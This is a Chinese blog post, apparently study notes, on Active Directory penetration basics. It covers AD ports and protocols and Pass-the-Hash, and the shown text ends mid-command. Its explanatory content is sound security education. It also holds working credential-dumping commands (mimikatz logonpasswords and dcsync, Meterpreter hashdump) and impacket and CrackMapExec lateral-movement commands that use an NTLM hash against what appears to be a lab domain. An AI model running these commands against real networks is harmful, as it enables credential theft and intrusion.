@@ -1,0 +1,1105 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="域基础知识域常见常见协议&#x2F;服务   协议&#x2F;服务 默认端口 核心作用    DNS 53&#x2F;TCP, UDP 域名解析、服务定位、记录查询   HTTP(S) 80&#x2F;TCP；443&#x2F;TCP Web服务、API、ADFS等   Kerberos 88&#x2F;TCP, UDP 域认证协议，票据机制   NTP 123&#x2F;UDP 时间同步   M">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透基础">
+<meta property="og:url" content="http://example.com/2026/test45/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="域基础知识域常见常见协议&#x2F;服务   协议&#x2F;服务 默认端口 核心作用    DNS 53&#x2F;TCP, UDP 域名解析、服务定位、记录查询   HTTP(S) 80&#x2F;TCP；443&#x2F;TCP Web服务、API、ADFS等   Kerberos 88&#x2F;TCP, UDP 域认证协议，票据机制   NTP 123&#x2F;UDP 时间同步   M">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152203326.png">
+<meta property="article:published_time" content="2026-04-15T10:15:22.867Z">
+<meta property="article:modified_time" content="2026-04-15T14:03:26.449Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="学习总结">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152203326.png">
+  
+  
+  
+  <title>域渗透基础 - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="域渗透基础"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:15" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">域渗透基础</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="域基础知识"><a href="#域基础知识" class="headerlink" title="域基础知识"></a>域基础知识</h1><h2 id="域常见常见协议-服务"><a href="#域常见常见协议-服务" class="headerlink" title="域常见常见协议&#x2F;服务"></a>域常见常见协议&#x2F;服务</h2><table>
+<thead>
+<tr>
+<th>协议&#x2F;服务</th>
+<th>默认端口</th>
+<th>核心作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>DNS</strong></td>
+<td>53&#x2F;TCP, UDP</td>
+<td>域名解析、服务定位、记录查询</td>
+</tr>
+<tr>
+<td><strong>HTTP(S)</strong></td>
+<td>80&#x2F;TCP；443&#x2F;TCP</td>
+<td>Web服务、API、ADFS等</td>
+</tr>
+<tr>
+<td><strong>Kerberos</strong></td>
+<td>88&#x2F;TCP, UDP</td>
+<td>域认证协议，票据机制</td>
+</tr>
+<tr>
+<td><strong>NTP</strong></td>
+<td>123&#x2F;UDP</td>
+<td>时间同步</td>
+</tr>
+<tr>
+<td><strong>MS-RPC</strong></td>
+<td>135&#x2F;TCP + 动态高位端口</td>
+<td>Windows 远程过程调用基础框架，WMI&#x2F;DCOM</td>
+</tr>
+<tr>
+<td><strong>NetBIOS</strong></td>
+<td>137&#x2F;UDP, 138&#x2F;UDP, 139&#x2F;TCP</td>
+<td>旧式名称解析、会话与共享支持</td>
+</tr>
+<tr>
+<td><strong>LDAP(S)</strong></td>
+<td>389&#x2F;TCP, UDP;636&#x2F;TCP</td>
+<td>目录服务协议，管理用户、组、计算机等目录对象</td>
+</tr>
+<tr>
+<td><strong>SMB&#x2F;CIFS</strong></td>
+<td>445&#x2F;TCP；139&#x2F;TCP 为兼容场景</td>
+<td>文件共享、命名管道、IPC 通信</td>
+</tr>
+<tr>
+<td><strong>MSSQL</strong></td>
+<td>1433&#x2F;TCP；1434&#x2F;UDP 常见</td>
+<td>数据库服务</td>
+</tr>
+<tr>
+<td><strong>Global Catalog(S)</strong></td>
+<td>3268&#x2F;TCP；3269&#x2F;TCP</td>
+<td>林范围目录检索</td>
+</tr>
+<tr>
+<td><strong>RDP</strong></td>
+<td>3389&#x2F;TCP</td>
+<td>远程桌面协议</td>
+</tr>
+<tr>
+<td><strong>WinRM</strong></td>
+<td>5985&#x2F;TCP；5986&#x2F;TCP</td>
+<td>远程管理协议，PowerShell远程控制</td>
+</tr>
+</tbody></table>
+<p><strong>Active Directory 端口、服务、漏洞及工具</strong></p>
+<ul>
+<li>端口 53（DNS）<ul>
+<li>漏洞：DNS 缓存投毒、DNS 放大攻击、域成员定位、域控发现、数据外带等</li>
+<li>工具：nslookup，dig，dnsenum，Fierce，dnsrecon，dnstracer</li>
+</ul>
+</li>
+<li>端口 88（Kerberos）<ul>
+<li>漏洞：AS-REP Roasting、票据伪造、票据传递、Silver Ticket 攻击、Golden Ticket 攻击</li>
+<li>工具：impacket，Rubeus，Kerbrute，Hashcat，GetUserSPN，mitm6</li>
+</ul>
+</li>
+<li>端口 135（MS-RPC）<ul>
+<li>漏洞：DCOM 利用、MS-RPC 权限提升</li>
+<li>工具：rpcclient，Metasploit，NMap，PowerSploit，NetExec（CrackMapExec），Evil-WinRM</li>
+</ul>
+</li>
+<li>端口 137-139（NetBIOS）<ul>
+<li>漏洞：SMB 中继、NTLM 中继、NetBIOS 欺骗</li>
+<li>工具：smbclient，Responder，impacket，NMap，NetExec（CrackMapExec）</li>
+</ul>
+</li>
+<li>端口 389（LDAP）<ul>
+<li>漏洞：LDAP 注入、凭证收集、匿名绑定</li>
+<li>工具：ldapsearch，NMap，ldapdomaindump，NetExec（CrackMapExec），BloodHound，ADExplorer，Certipy</li>
+</ul>
+</li>
+<li>端口 445（SMB）<ul>
+<li>漏洞：EternalBlue、SMB 中继、SMB 签名未启用、哈希传递</li>
+<li>工具：smbclient，impacket，NMap，NetExec（CrackMapExec），Metasploit，smbmap</li>
+</ul>
+</li>
+<li>端口 464（Kerberos 密码更改）<ul>
+<li>漏洞：Kerberoasting、密码喷洒</li>
+<li>工具：impacket，Rubeus，Kerbrute，Hashcat，KrbRelayUp</li>
+</ul>
+</li>
+<li>端口 593（HTTP RPC）<ul>
+<li>漏洞：认证绕过、MS-RPC 注入</li>
+<li>工具：rpcclient，Metasploit，NMap，PowerSploit，Evil-WinRM，NetExec（CrackMapExec）</li>
+</ul>
+</li>
+<li>端口 636（LDAPS）<ul>
+<li>漏洞：LDAP 注入、证书伪造</li>
+<li>工具：ldapsearch，NMap，NetExec（CrackMapExec），BloodHound，ADExplorer</li>
+</ul>
+</li>
+<li>端口 3268-3269（Global Catalog）<ul>
+<li>漏洞：LDAP 注入、数据泄漏</li>
+<li>工具：ldapsearch，NMap，NetExec（CrackMapExec），BloodHound，ADExplorer</li>
+</ul>
+</li>
+<li>端口 3389（RDP）<ul>
+<li>漏洞：BlueKeep、弱加密、RDP 劫持、凭证转发</li>
+<li>工具：ncrack，xfreerdp，Metasploit，NetExec（CrackMapExec），rdpscan</li>
+</ul>
+</li>
+<li>端口 5985-5986（WinRM）<ul>
+<li>漏洞：凭证窃取、哈希传递、非约束性委派</li>
+<li>工具：Evil-WinRM，Impacket，NetExec（CrackMapExec），Metasploit，PowerView</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://github.com/ZishanAdThandar/pentest/blob/main/notes/AllAboutPentesting.md">pentest&#x2F;notes&#x2F;AllAboutPentesting.md at main · ZishanAdThandar&#x2F;pentest</a></p>
+</blockquote>
+<h2 id="协议对比"><a href="#协议对比" class="headerlink" title="协议对比"></a>协议对比</h2><h3 id="WMI-DCOM-MS-RPC"><a href="#WMI-DCOM-MS-RPC" class="headerlink" title="WMI&#x2F;DCOM&#x2F;MS-RPC"></a>WMI&#x2F;DCOM&#x2F;MS-RPC</h3><p>一句话概括：</p>
+<blockquote>
+<p><strong>WMI 远程管理通常依赖 DCOM，而 DCOM 又依赖 MS-RPC。</strong></p>
+</blockquote>
+<ol>
+<li><p>MS-RPC</p>
+<p>MS-RPC &#x3D; Microsoft Remote Procedure Call。</p>
+<p>它本质上是一套让一台机器调用另一台机器上“函数&#x2F;过程”的通信机制，是很多 Windows 远程管理能力的基础设施。你可以把它理解成“<strong>底层通道&#x2F;调用框架</strong>”。</p>
+</li>
+<li><p>DCOM</p>
+<p>DCOM &#x3D; Distributed Component Object Model。</p>
+<p>它本质上是COM 的分布式版本，用来让程序远程调用另一台机器上的 COM 对象</p>
+<p>而 DCOM 的远程通信不是自己重新发明一套协议，它通常就是跑在 RPC 之上。</p>
+<p>可以粗略理解成：RPC 解决“怎么远程调”，DCOM 解决“怎么远程调对象组件”</p>
+</li>
+<li><p>WMI</p>
+<p>WMI &#x3D; Windows Management Instrumentation。</p>
+<p>它本质上是Windows 提供的一套系统管理框架，可以查询和管理进程、服务、网络配置、计划任务、补丁、硬件信息、事件日志等等</p>
+<p>WMI 本身更像“管理接口&#x2F;数据模型”。重点是：本地调用 WMI 不一定涉及网络，远程调用 WMI 时，传统方式通常使用 DCOM，所以远程 WMI 又会继续落到 RPC</p>
+<p>也就是：<strong>WMI → DCOM → MS-RPC</strong></p>
+</li>
+</ol>
+<p>三者的关系图</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">WMI（管理功能/接口）<br>  ↓<br>DCOM（远程对象调用）<br>  ↓<br>MS-RPC（底层远程过程调用通信）<br></code></pre></td></tr></table></figure>
+
+<p>或者更形象一点：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">你想做的事：查询远程机器上的系统信息<br><span class="hljs-section">= 用 WMI 提出管理请求</span><br><span class="hljs-section">= 通过 DCOM 把这个请求发到远端对象</span><br><span class="hljs-section">= 由 MS-RPC 负责底层通信</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="SMB、WMI"><a href="#SMB、WMI" class="headerlink" title="SMB、WMI"></a>SMB、WMI</h3><ol>
+<li><p><strong>SMB（Server Message Block）</strong></p>
+<p>SMB 就像是“局域网文件快递员”</p>
+<p>它是Windows电脑之间传文件、共享打印机、远程管理的一种“快递协议”。如果你在公司电脑上输入 <code>\\共享电脑\共享文件夹</code>，其实就是用的SMB协议。黑客渗透时常用这个“快递员”来远程投递木马、执行命令（比如psexec、smbexec等）。</p>
+<p>例子：你在公司电脑A上访问电脑B的共享文件夹，就是SMB在帮你传送文件。</p>
+</li>
+<li><p><strong>WMI（Windows Management Instrumentation）</strong></p>
+<p>WMI 就像是“Windows的万能遥控器”</p>
+<p>它让你可以用命令远程控制Windows电脑，比如开关服务、查进程、执行命令等。管理员和运维可以批量用WMI查看电脑状态，黑客可以用它偷偷远程下指令，而且一般不会在目标电脑上留下“文件痕迹”。WMI背后其实是靠DCOM&#x2F;RPC协议实现的。</p>
+<p>例子：你在一台电脑用WMI命令让另一台电脑重启，这就是WMI的“远程遥控”能力。</p>
+</li>
+</ol>
+<p>由此，再主要区分一下smbexec.py与wmiexec.py：</p>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>协议&#x2F;原理</th>
+<th>留痕</th>
+<th>适用性</th>
+<th>回显方式</th>
+<th>典型用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>smbexec.py</strong></td>
+<td>SMB+服务</td>
+<td>有</td>
+<td>广</td>
+<td>文件</td>
+<td>横向、持久化</td>
+</tr>
+<tr>
+<td><strong>wmiexec.py</strong></td>
+<td>WMI接口</td>
+<td>少</td>
+<td>稍低</td>
+<td>命名管道</td>
+<td>横向、隐蔽</td>
+</tr>
+</tbody></table>
+<p><strong>smbexec适合常规横向批量打点，wmiexec适合目标环境安全策略较高或需低留痕场景</strong>。</p>
+<h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Pass-the-Hash（PTH，哈希传递攻击）是一种经典的内网横向技术，攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码</p>
+<p>pass the hash原理：</p>
+<ul>
+<li>在Windows系统中，通常会使用NTLM身份认证</li>
+<li>NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)</li>
+<li>hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash</li>
+<li>如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)</li>
+</ul>
+<p>这类攻击适用于：</p>
+<ul>
+<li>域&#x2F;工作组环境</li>
+<li>可以获得hash，但是条件不允许对hash爆破</li>
+<li>内网中存在和当前机器相同的密码</li>
+</ul>
+<p>微软也对pth打过补丁，然而在测试中发现，在打了补丁后，常规的Pass The Hash已经无法成功，唯独默认的Administrator(SID 500)账号例外，利用这个账号仍可以进行Pass The Hash远程ipc连接。</p>
+<p><strong>PTH攻击核心前提是目标服务未禁用NTLM认证</strong>。如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。</p>
+<p>在现在的Windows系统中，通常使用NTLM身份认证，LM Hash一般在很老的机器上才会使用</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152203326.png" srcset="/img/loading.gif" lazyload alt="Pasted image 20250223230214"></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="获取hash"><a href="#获取hash" class="headerlink" title="获取hash"></a>获取hash</h4><p>有很多种方式，这里列举两种</p>
+<p><strong>方法一：使用 mimikatz 获取hash（最常用）</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell">mimikatz.exe privilege::debug<br>mimikatz.exe sekurlsa::logonpasswords <span class="hljs-comment"># 抓取保存的所有凭证（包括hash）</span><br><br><br><span class="hljs-comment"># msf有mimikatz的插件</span><br>load kiwi<br>kiwi_cmd privilege::debug<br>kiwi_cmd <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span><br>kiwi_cmd <span class="hljs-string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>方法二：使用 Metasploit 获取hash</strong></p>
+<p>首先需要先获取到一个session</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; hashdump <span class="hljs-comment"># 导出hash，CS也有此命令</span><br><br>meterpreter &gt; load kiwi <span class="hljs-comment"># 加载mimiktaz模块</span><br>meterpreter &gt; creds_all<br></code></pre></td></tr></table></figure>
+
+<p><code>creds_all</code> 是 Meterpreter kiwi 扩展里的“总抓取”命令。它会自动调用 Mimikatz 的多个模块和命令，<strong>不仅仅是sekurlsa::logonpasswords</strong>，包括了如下内容：</p>
+<ul>
+<li><strong>sekurlsa::logonpasswords</strong>（抓内存中已登录用户的明文密码、hash、票据等）</li>
+<li><strong>lsadump::sam</strong>（本地用户的 NTLM hash）</li>
+<li><strong>lsadump::secrets</strong>（本地机密、服务密码等）</li>
+<li><strong>kerberos::list</strong>（Kerberos 票据）</li>
+<li><strong>其他如 RDP、Wdigest、DPAPI 等相关凭据抓取</strong></li>
+</ul>
+<h4 id="使用hash"><a href="#使用hash" class="headerlink" title="使用hash"></a>使用hash</h4><p><strong>PTH的常见工具&#x2F;方式</strong></p>
+<table>
+<thead>
+<tr>
+<th>工具&#x2F;方式</th>
+<th>协议</th>
+<th>说明&#x2F;用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>psexec.py</strong></td>
+<td>SMB</td>
+<td>经典横向，模拟PSEXEC，落地文件</td>
+</tr>
+<tr>
+<td><strong>smbexec.py</strong></td>
+<td>SMB</td>
+<td>类似psexec，落地文件但更隐蔽</td>
+</tr>
+<tr>
+<td><strong>wmiexec.py</strong></td>
+<td>WMI&#x2F;DCOM</td>
+<td>无文件落地，适合隐蔽</td>
+</tr>
+<tr>
+<td><strong>atexec.py</strong></td>
+<td>SMB&#x2F;AT服务</td>
+<td>利用计划任务at命令，落地文件</td>
+</tr>
+<tr>
+<td><strong>dcomexec.py</strong></td>
+<td>DCOM</td>
+<td>利用Dcom对象远控（如MMC、Shell），无文件落地</td>
+</tr>
+<tr>
+<td><strong>CrackMapExec</strong></td>
+<td>SMB&#x2F;WMI&#x2F;WinRM等</td>
+<td>多合一横向打击，支持PTH（WinRM需明文&#x2F;票据）</td>
+</tr>
+</tbody></table>
+<ol>
+<li><p><strong>impacket 工具集</strong></p>
+<p>Kali内置了impacket 工具集，这里我pipx又安装了一遍，所以有两种命令</p>
+<p>smbexec：类似psexec，上传脚本到共享后执行，支持PTH。（需要445或139端口开放）</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">smbexec.py -hashes <span class="hljs-symbol">:&lt;NTLM_HASH&gt;</span> [domain/]username<span class="hljs-variable">@target</span><br>proxychains4 impacket-smbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">2</span>f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator<span class="hljs-variable">@172</span>.<span class="hljs-number">22.9</span>.<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure>
+
+<p>psexec：利用SMB协议模拟PSEXEC机制（上传批处理脚本并通过服务执行），最常用的PTH横向工具。（需要445或139端口开放）</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">psexec.py -hashes <span class="hljs-symbol">:&lt;NTLM_HASH&gt;</span> [domain/]username<span class="hljs-variable">@target</span><br>proxychains4 impacket-psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">2</span>f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator<span class="hljs-variable">@172</span>.<span class="hljs-number">22.9</span>.<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure>
+
+<p>atexec：通过计划任务AT命令远程执行，支持PTH。（需要445或139端口开放，这个必须带上命令，类似CrackMapExec，单命令执行）</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">atexec.py -hashes <span class="hljs-symbol">:&lt;NTLM_HASH&gt;</span> [domain/]username<span class="hljs-variable">@target</span> command<br>proxychains4 impacket-atexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">2</span>f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator<span class="hljs-variable">@172</span>.<span class="hljs-number">22.9</span>.<span class="hljs-number">7</span> whoami<br></code></pre></td></tr></table></figure>
+
+<p>wmiexec：利用WMI&#x2F;DCOM接口，较隐蔽，不落地文件，支持PTH。 （ 需要135端口开放）</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">wmiexec.py -hashes <span class="hljs-symbol">:&lt;NTLM_HASH&gt;</span> [domain/]username<span class="hljs-variable">@target</span><br>proxychains4 impacket-wmiexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">2</span>f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator<span class="hljs-variable">@172</span>.<span class="hljs-number">22.9</span>.<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure>
+
+<p>dcomexec：通过多种DCOM对象远程执行（如MMC、Shell），支持PTH。这里没试成，报 CO_E_RUNAS_LOGON_FAILURE。（需要135端口开放，如果报 CO_E_RUNAS_LOGON_FAILURE，多半是 Windows&#x2F;组策略&#x2F;DCOM配置限制）</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">dcomexec.py -hashes <span class="hljs-symbol">:&lt;NTLM_HASH&gt;</span> [domain/]username<span class="hljs-variable">@target</span><br>proxychains4 impacket-dcomexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">2</span>f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator<span class="hljs-variable">@172</span>.<span class="hljs-number">22.9</span>.<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure>
+
+<p>smbclient （需要445或139端口开放）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient.py -hashes :&lt;NTLM_HASH&gt; [domain/]username@target<br>proxychains4 impacket-smbclient -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>CrackMapExec（CME）</strong></p>
+<p>多合一横向工具，支持批量横向和模块化利用，对SMB&#x2F;WMI&#x2F;WinRM等接口都可尝试。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"># crackmapexec smb <span class="hljs-keyword">target</span> -u username -H &lt;NTLM_HASH&gt; -d domain -<span class="hljs-keyword">x</span> <span class="hljs-string">&quot;whoami&quot;</span><br>proxychains crackmapexec smb <span class="hljs-number">172.22</span>.<span class="hljs-number">9.7</span> -u administrator -H <span class="hljs-number">2</span>f<span class="hljs-number">1</span>b<span class="hljs-number">57</span>eefb<span class="hljs-number">2</span>d<span class="hljs-number">152196836</span>b<span class="hljs-number">0516</span>abea<span class="hljs-number">80</span> -d xiaorang.lab -<span class="hljs-keyword">x</span> <span class="hljs-string">&quot;type c:\users\administrator\flag\flag.txt&quot;</span><br># nxc smb <span class="hljs-number">172.22</span>.<span class="hljs-number">9.7</span> -u administrator -p pass -<span class="hljs-keyword">x</span> whoami<br># crackmapexec wmi <span class="hljs-number">172.22</span>.<span class="hljs-number">9.7</span> -u administrator -p pass -<span class="hljs-keyword">x</span> <span class="hljs-string">&quot;whoami&quot;</span><br># crackmapexec winrm <span class="hljs-number">172.22</span>.<span class="hljs-number">9.7</span> -u administrator -p pass -<span class="hljs-keyword">x</span> 